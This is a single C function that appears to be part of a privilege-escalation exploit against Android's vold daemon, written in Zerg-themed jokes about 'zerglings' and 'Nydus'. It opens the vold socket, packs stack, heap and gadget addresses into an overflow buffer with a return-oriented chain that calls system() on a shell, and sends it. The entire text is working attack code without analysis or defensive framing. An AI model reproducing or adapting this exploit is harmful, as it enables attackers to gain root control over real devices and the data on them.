static int do_fault()
{
	char buf[255];
	int sock = -1, n = 0, i;
	char s_stack_addr[5], s_stack_pivot_addr[5], s_pop_r0_addr[5], s_system[5], s_bsh_addr[5], s_heap_addr[5];
	uint32_t bsh_addr;
	char padding[128];
	int32_t padding_sz = (jumpsz == 0 ? 0 : gadget_jumpsz - jumpsz);

	memset(padding, 0, 128);
	strcpy(padding, "LORDZZZZzzzz");
	if(padding_sz > 0) {
		memset(padding+12, 'Z', padding_sz);
		printf("[*] Poping %d more zerglings\n", padding_sz);
	}
	else if(padding_sz < 0) {
		memset(padding, 0, 128);
		memset(padding, 'Z', 12+padding_sz);
	}

	if ((sock = socket_local_client("vold", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0)
		die("[-] Error creating Nydus");

	sprintf(s_stack_addr, "%c%c%c%c", stack_addr & 0xff, (stack_addr>>8)&0xff, (stack_addr>>16)&0xff, (stack_addr>>24)&0xff);
	sprintf(s_stack_pivot_addr, "%c%c%c%c", stack_pivot & 0xff, (stack_pivot>>8)&0xff, (stack_pivot>>16)&0xff, (stack_pivot>>24)&0xff);
	sprintf(s_pop_r0_addr, "%c%c%c%c", pop_r0 & 0xff, (pop_r0>>8)&0xff, (pop_r0>>16)&0xff, (pop_r0>>24)&0xff);
	sprintf(s_system, "%c%c%c%c", system_ptr & 0xff, (system_ptr>>8)&0xff, (system_ptr>>16)&0xff, (system_ptr>>24)&0xff);
	sprintf(s_heap_addr, "%c%c%c%c", heap_addr & 0xff, (heap_addr>>8)&0xff, (heap_addr>>16)&0xff, (heap_addr>>24)&0xff);

	strcpy(buf, "ZERG");
	strcat(buf, " ZZ ");
	strcat(buf, s_stack_pivot_addr);
	for(i=3; i < buffsz+1; i++)
		strcat(buf, " ZZZZ");
	strcat(buf, " ");
	strcat(buf, s_heap_addr);
		
	n = strlen(buf);
	bsh_addr = stack_addr + n + 1 + 8 + 8 + 8 + padding_sz + 12 + 4;
	
	if(check_addr(bsh_addr) == -1) {
		printf("[-] Colossus, we're doomed!\n");
		exit(-1);
	}

	sprintf(s_bsh_addr, "%c%c%c%c", bsh_addr & 0xff, (bsh_addr>>8)&0xff, (bsh_addr>>16)&0xff, (bsh_addr>>24)&0xff);

	n += sprintf(buf+n+1, "%s%s OVER%s%s%s%sZZZZ%s%c", s_stack_addr, s_heap_addr, padding, s_pop_r0_addr, s_bsh_addr, s_system, bsh, 0);
	
	printf("[*] Sending %d zerglings ...\n", n);

	if ((n = write(sock, buf, n+1)) < 0)
		die("[-] Nydus seems broken");
	
	sleep(3);
	close(sock);

	return n;
}
